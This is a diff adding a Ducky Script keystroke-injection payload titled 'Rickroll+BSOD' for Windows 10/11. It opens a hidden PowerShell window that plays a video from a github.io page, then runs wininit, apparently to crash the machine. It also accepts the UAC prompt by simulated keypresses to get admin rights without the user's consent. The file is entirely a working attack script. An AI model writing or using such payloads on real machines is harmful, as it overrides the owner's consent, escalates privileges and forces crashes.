@@ -1,0 +1,23 @@
+REM Author: H4K0N42
+REM Title: Rickroll+BSOD
+REM Target: Windows 10/11
+REM Description: Rickrolls the Target and crashes the PC.
+
+
+REM Run Attack
+GUI r
+DELAY 250
+STRING powershell -w hidden "start https://H4K0N42.github.io/nggyu/video.webm; timeout /NOBREAK /t 20; wininit"
+
+
+REM Get Admin-Permission
+CTRL SHIFT ENTER
+DELAY 750
+LEFT
+DELAY 100
+ENTER
+
+
+REM Fullscreen Rickroll
+DELAY 3000
+F11
